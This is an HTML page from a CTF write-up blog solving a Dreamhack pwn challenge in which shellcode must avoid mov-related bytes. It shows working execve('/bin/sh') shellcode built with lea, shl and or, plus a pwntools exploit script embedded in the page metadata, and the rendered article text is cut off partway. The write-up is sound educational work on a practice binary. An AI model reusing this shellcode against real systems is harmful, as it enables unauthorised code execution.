@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Dreamhack No mov Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="Dreamhack, pwn">
+<meta name="description" content="Challenge overview
+셸코딩, 이제는 익숙해졌겠죠? mov가 없이도 셸코딩할 수 있는지 한 번 테스트해봅시다.
+이 바이너리는 여러분이 입력한 셸코드에 mov에 해당하는 바이트가 있는지 확인하고, 없으면 실행시켜줍니다.
+어떻게든 ./flag를 읽어와보세요!
+
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int bytes_read; // edx
+  void *s; // [rsp&#43;10h] [rbp-10h]
+  _QWORD *mmaped_page; // [rsp&#43;18h] [rbp-8h]
+
+  initialize(argc, argv, envp);
+  s = get_mmaped_page();
+  mmaped_page = get_mmaped_page();
+  if ( s &amp;&amp; mmaped_page )
+  {
+    memset(s, 144, 0x1000u);
+    memset(mmaped_page, 0, 0x1000u);
+    printf(&#34;Give me your shellcode &gt; &#34;);
+    bytes_read = read(0, s, 0x800u);
+    if ( (unsigned int)verify((__int64)s, bytes_read) )
+      mmaped_page[255] = s;
+    else
+      puts(&#34;No.&#34;);
+    return 0;
+  }
+  else
+  {
+    puts(&#34;Failed mmap&#34;);
+    return 1;
+  }
+}
+
+More shellcode!">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/nomov-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/nomov-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/nomov-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="Dreamhack No mov Writeup">
+  <meta property="og:description" content="Challenge overview 셸코딩, 이제는 익숙해졌겠죠? mov가 없이도 셸코딩할 수 있는지 한 번 테스트해봅시다. 이 바이너리는 여러분이 입력한 셸코드에 mov에 해당하는 바이트가 있는지 확인하고, 없으면 실행시켜줍니다. 어떻게든 ./flag를 읽어와보세요!
+int __fastcall main(int argc, const char **argv, const char **envp) { int bytes_read; // edx void *s; // [rsp&#43;10h] [rbp-10h] _QWORD *mmaped_page; // [rsp&#43;18h] [rbp-8h] initialize(argc, argv, envp); s = get_mmaped_page(); mmaped_page = get_mmaped_page(); if ( s &amp;&amp; mmaped_page ) { memset(s, 144, 0x1000u); memset(mmaped_page, 0, 0x1000u); printf(&#34;Give me your shellcode &gt; &#34;); bytes_read = read(0, s, 0x800u); if ( (unsigned int)verify((__int64)s, bytes_read) ) mmaped_page[255] = s; else puts(&#34;No.&#34;); return 0; } else { puts(&#34;Failed mmap&#34;); return 1; } } More shellcode!">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-07T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-07T00:00:00+00:00">
+    <meta property="article:tag" content="Dreamhack">
+    <meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dreamhack No mov Writeup">
+<meta name="twitter:description" content="Challenge overview
+셸코딩, 이제는 익숙해졌겠죠? mov가 없이도 셸코딩할 수 있는지 한 번 테스트해봅시다.
+이 바이너리는 여러분이 입력한 셸코드에 mov에 해당하는 바이트가 있는지 확인하고, 없으면 실행시켜줍니다.
+어떻게든 ./flag를 읽어와보세요!
+
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int bytes_read; // edx
+  void *s; // [rsp&#43;10h] [rbp-10h]
+  _QWORD *mmaped_page; // [rsp&#43;18h] [rbp-8h]
+
+  initialize(argc, argv, envp);
+  s = get_mmaped_page();
+  mmaped_page = get_mmaped_page();
+  if ( s &amp;&amp; mmaped_page )
+  {
+    memset(s, 144, 0x1000u);
+    memset(mmaped_page, 0, 0x1000u);
+    printf(&#34;Give me your shellcode &gt; &#34;);
+    bytes_read = read(0, s, 0x800u);
+    if ( (unsigned int)verify((__int64)s, bytes_read) )
+      mmaped_page[255] = s;
+    else
+      puts(&#34;No.&#34;);
+    return 0;
+  }
+  else
+  {
+    puts(&#34;Failed mmap&#34;);
+    return 1;
+  }
+}
+
+More shellcode!">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Dreamhack No mov Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/nomov-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Dreamhack No mov Writeup",
+  "name": "Dreamhack No mov Writeup",
+  "description": "Challenge overview 셸코딩, 이제는 익숙해졌겠죠? mov가 없이도 셸코딩할 수 있는지 한 번 테스트해봅시다. 이 바이너리는 여러분이 입력한 셸코드에 mov에 해당하는 바이트가 있는지 확인하고, 없으면 실행시켜줍니다. 어떻게든 ./flag를 읽어와보세요!\nint __fastcall main(int argc, const char **argv, const char **envp) { int bytes_read; // edx void *s; // [rsp+10h] [rbp-10h] _QWORD *mmaped_page; // [rsp+18h] [rbp-8h] initialize(argc, argv, envp); s = get_mmaped_page(); mmaped_page = get_mmaped_page(); if ( s \u0026amp;\u0026amp; mmaped_page ) { memset(s, 144, 0x1000u); memset(mmaped_page, 0, 0x1000u); printf(\u0026#34;Give me your shellcode \u0026gt; \u0026#34;); bytes_read = read(0, s, 0x800u); if ( (unsigned int)verify((__int64)s, bytes_read) ) mmaped_page[255] = s; else puts(\u0026#34;No.\u0026#34;); return 0; } else { puts(\u0026#34;Failed mmap\u0026#34;); return 1; } } More shellcode!\n",
+  "keywords": [
+    "Dreamhack", "pwn"
+  ],
+  "articleBody": "Challenge overview 셸코딩, 이제는 익숙해졌겠죠? mov가 없이도 셸코딩할 수 있는지 한 번 테스트해봅시다. 이 바이너리는 여러분이 입력한 셸코드에 mov에 해당하는 바이트가 있는지 확인하고, 없으면 실행시켜줍니다. 어떻게든 ./flag를 읽어와보세요!\nint __fastcall main(int argc, const char **argv, const char **envp) { int bytes_read; // edx void *s; // [rsp+10h] [rbp-10h] _QWORD *mmaped_page; // [rsp+18h] [rbp-8h] initialize(argc, argv, envp); s = get_mmaped_page(); mmaped_page = get_mmaped_page(); if ( s \u0026\u0026 mmaped_page ) { memset(s, 144, 0x1000u); memset(mmaped_page, 0, 0x1000u); printf(\"Give me your shellcode \u003e \"); bytes_read = read(0, s, 0x800u); if ( (unsigned int)verify((__int64)s, bytes_read) ) mmaped_page[255] = s; else puts(\"No.\"); return 0; } else { puts(\"Failed mmap\"); return 1; } } More shellcode!\nIdentifying the vulnerabilities Let’s analyze what’s happening in here a little. We have 0x800 bytes of shellcode, quite a lot! I don’t see it getting executed anywhere, only that the mmap is RWX, but whatever.\n__int64 __fastcall verify(__int64 s, int bytes_read) { int i; // [rsp+18h] [rbp-38h] unsigned int j; // [rsp+1Ch] [rbp-34h] _QWORD v5[3]; // [rsp+20h] [rbp-30h] int v6; // [rsp+38h] [rbp-18h] __int16 v7; // [rsp+3Ch] [rbp-14h] unsigned __int64 v8; // [rsp+48h] [rbp-8h] v8 = __readfsqword(0x28u); v5[0] = 0xA1A08E8C8B8A8988LL; v5[1] = 0xB3B2B1B0A5A4A3A2LL; v5[2] = 0xBBBAB9B8B7B6B5B4LL; v6 = 0xBFBEBDBC; v7 = 0xC7C6; for ( i = 0; i \u003c bytes_read; ++i ) { for ( j = 0; j \u003c= 0x1D; ++j ) { if ( *(_BYTE *)(i + s) == *((_BYTE *)v5 + (int)j) ) return 0; } } return 1; } Here, for each byte in our input, we compare it to one of the bytes in v5 (we check from v5 to v5 + 29). v5 stores three 8-byte values. So that’s just a blacklist for us. But it’s also checking beyond v5; There’s hex stored in v6 and v7, and it’s checking up to 29.\nInteresting, let’s see what is forbidden for us!\nI first, of course, tried the easy way out:\nsc = asm(shellcraft.sh()) bad = bytes.fromhex('A1A08E8C8B8A8988B3B2B1B0A5A4A3A2BBBAB9B8B7B6B5B4BFBEBDBCC7C6') encoded = pwnlib.encoders.encode(sc, avoid=bad) print(len(encoded)) But I got back the message No encoders for amd64 which can avoid b'\\x88\\x89\\x8a\\x8b\\x8c\\x8e\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb'. Well I sure can!\nI tested a couple asm functions, and mov did indeed seem to be getting blacklisted a lot because it contained 0x89 or 0xc7. I made this little helper function:\nbad = bytearray.fromhex('A1A08E8C8B8A8988B3B2B1B0A5A4A3A2BBBAB9B8B7B6B5B4BFBEBDBCC7C6') def is_ok(sc): for b in bad: if b in sc: print(f\"bad, found {hex(b)}!\") return 0 return 1 So, what can we use instead of mov? Well, after a quick Google search, looks like lea! But we have to understand the differences between them. If you’re actually curious read this. If not, look at it like this:\nmov edi, 0x100 = lea edi, [0x100]\nI came up with this glorious shellcode, but it kept crashing:\nsc = asm(''' lea rax, [0x68732f6e] push rax lea rax, [0x69622f] push rax lea rdi, [rsp] xor rsi, rsi xor rdx, rdx lea rax, [0x3b] syscall ''') The reason was that I was pushing the whole rax, but I was only loading half of it each time; So it ended up looking like this:\n0x0000000068732f6e 0x000000000069622f So, after loading the first value, we can shift it to the left four bytes (that’s with the null byte I didn’t add in the sequence above). That’s 8 * 4 bits, so we move them to the left we can make some space on the right; Then, we can or it with the remaining part of the lower bytes.\nsc = asm(''' lea rax, [0x0068732f] shl rax, 32 or rax, 0x6e69622f push rax lea rdi, [rsp] xor rsi, rsi xor rdx, rdx lea rax, [0x3b] syscall ''') Now, it works locally! Let’s connect remotely and get the flag!\nThe exploit from pwn import * elf = ELF('/home/kali/Downloads/dreamhack/nomov/deploy/main') context.arch = 'amd64' cyberedu = 'host8.dreamhack.games:14508' ip, port = cyberedu.split(':') port = int(port) if args.REMOTE: p = remote(ip, port) else: p = elf.process() bad = bytearray.fromhex('A1A08E8C8B8A8988B3B2B1B0A5A4A3A2BBBAB9B8B7B6B5B4BFBEBDBCC7C6') def is_ok(sc): for b in bad: if b in sc: print(f\"bad, found {hex(b)}!\") return 0 return 1 sc = asm(''' lea rax, [0x0068732f] shl rax, 32 or rax, 0x6e69622f push rax lea rdi, [rsp] xor rsi, rsi xor rdx, rdx lea rax, [0x3b] syscall ''') is_ok(sc) print(sc) p.send(sc) p.interactive() As always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "702",
+  "inLanguage": "en",
+  "datePublished": "2026-05-07T00:00:00Z",
+  "dateModified": "2026-05-07T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/nomov-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Dreamhack No mov Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-05-07 00:00:00 +0000 UTC'>May 7, 2026</span>&nbsp;·&nbsp;<span>4 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
+                <li>
+                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>셸코딩, 이제는 익숙해졌겠죠? mov가 없이도 셸코딩할 수 있는지 한 번 테스트해봅시다.
+이 바이너리는 여러분이 입력한 셸코드에 mov에 해당하는 바이트가 있는지 확인하고, 없으면 실행시켜줍니다.
+어떻게든 ./flag를 읽어와보세요!</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> bytes_read; <span style="color:#75715e">// edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>s; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _QWORD <span style="color:#f92672">*</span>mmaped_page; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">initialize</span>(argc, argv, envp);
+</span></span><span style="display:flex;"><span>  s <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_mmaped_page</span>();
+</span></span><span style="display:flex;"><span>  mmaped_page <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_mmaped_page</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( s <span style="color:#f92672">&amp;&amp;</span> mmaped_page )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(s, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">0x1000u</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(mmaped_page, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1000u</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Give me your shellcode &gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    bytes_read <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, s, <span style="color:#ae81ff">0x800u</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">verify</span>((<span style="color:#66d9ef">__int64</span>)s, bytes_read) )
+</span></span><span style="display:flex;"><span>      mmaped_page[<span style="color:#ae81ff">255</span>] <span style="color:#f92672">=</span> s;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;No.&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Failed mmap&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<p>More shellcode!</p>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>Let&rsquo;s analyze what&rsquo;s happening in here a little. We have <code>0x800</code> bytes of shellcode, quite a lot! I don&rsquo;t see it getting executed anywhere, only that the <code>mmap</code> is RWX, but whatever.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">verify</span>(<span style="color:#66d9ef">__int64</span> s, <span style="color:#66d9ef">int</span> bytes_read)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+18h] [rbp-38h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> j; <span style="color:#75715e">// [rsp+1Ch] [rbp-34h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _QWORD v5[<span style="color:#ae81ff">3</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-30h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [rsp+38h] [rbp-18h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int16</span> v7; <span style="color:#75715e">// [rsp+3Ch] [rbp-14h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// [rsp+48h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  v5[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xA1A08E8C8B8A8988LL</span>;
+</span></span><span style="display:flex;"><span>  v5[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xB3B2B1B0A5A4A3A2LL</span>;
+</span></span><span style="display:flex;"><span>  v5[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xBBBAB9B8B7B6B5B4LL</span>;
+</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xBFBEBDBC</span>;
+</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xC7C6</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> bytes_read; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x1D</span>; <span style="color:#f92672">++</span>j )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_BYTE <span style="color:#f92672">*</span>)(i <span style="color:#f92672">+</span> s) <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)v5 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)j) )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Here, for each byte in our input, we compare it to one of the bytes in <code>v5</code> (we check from <code>v5</code> to <code>v5 + 29</code>). <code>v5</code> stores three 8-byte values. So that&rsquo;s just a blacklist for us. But it&rsquo;s also checking beyond <code>v5</code>; There&rsquo;s hex stored in <code>v6</code> and <code>v7</code>, and it&rsquo;s checking up to 29.</p>
+<p>Interesting, let&rsquo;s see what is forbidden for us!</p>
+<p>I first, of course, tried the easy way out:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sc <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+</span></span><span style="display:flex;"><span>bad <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;A1A08E8C8B8A8988B3B2B1B0A5A4A3A2BBBAB9B8B7B6B5B4BFBEBDBCC7C6&#39;</span>)
+</span></span><span style="display:flex;"><span>encoded <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>encoders<span style="color:#f92672">.</span>encode(sc, avoid<span style="color:#f92672">=</span>bad)
+</span></span><span style="display:flex;"><span>print(len(encoded))
+</span></span></code></pre></div><p>But I got back the message <code>No encoders for amd64 which can avoid b'\x88\x89\x8a\x8b\x8c\x8e\xa0\xa1\xa2\xa3\xa4\xa5\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb'</code>. Well I sure can!</p>
+<p>I tested a couple asm functions, and <code>mov</code> did indeed seem to be getting blacklisted a lot because it contained <code>0x89</code> or <code>0xc7</code>. I made this little helper function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>bad <span style="color:#f92672">=</span> bytearray<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;A1A08E8C8B8A8988B3B2B1B0A5A4A3A2BBBAB9B8B7B6B5B4BFBEBDBCC7C6&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_ok</span>(sc):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> bad:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> b <span style="color:#f92672">in</span> sc:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;bad, found </span><span style="color:#e6db74">{</span>hex(b)<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>So, what can we use instead of <code>mov</code>? Well, after a quick Google search, looks like <code>lea</code>! But we have to understand the differences between them. If you&rsquo;re actually curious read <a href="https://ratfactor.com/cards/lea">this</a>. If not, look at it like this:</p>
+<p><code>mov edi, 0x100</code> = <code>lea edi, [0x100]</code></p>
+<p>I came up with this glorious shellcode, but it kept crashing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sc <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea rax, [0x68732f6e]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">push rax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea rax, [0x69622f]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">push rax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea rdi, [rsp]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xor rsi, rsi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xor rdx, rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea rax, [0x3b]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
+</span></span></code></pre></div><p>The reason was that I was pushing the whole <code>rax</code>, but I was only loading half of it each time; So it ended up looking like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000068732f6e</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000069622f</span>
